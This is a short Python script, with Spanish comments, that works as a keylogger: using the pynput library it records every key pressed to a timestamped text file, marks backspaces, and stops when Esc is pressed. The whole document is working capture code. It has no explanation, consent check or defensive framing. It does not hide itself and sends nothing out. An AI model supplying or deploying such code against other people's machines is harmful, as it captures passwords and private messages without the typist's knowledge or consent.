import datetime
from pynput.keyboard import Listener, Key

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
filename = 'key_log_{}.txt'.format(d)

def key_recorder(key):
    with open(filename, 'a') as f:
        try:
            if key == Key.enter:
                f.write('\n')
            elif key == Key.space:
                f.write(' ')
            elif key == Key.backspace:
                f.write('%BORRAR%')
            else:
                f.write(str(key.char).replace("'", ""))
        except AttributeError:
            # La tecla no es imprimible (por ejemplo, teclas especiales)
            pass

def on_release(key):
    if key == Key.esc:
        # Detén la grabación cuando se presiona la tecla Esc
        return False

with Listener(on_press=key_recorder, on_release=on_release) as listener:
    listener.join()
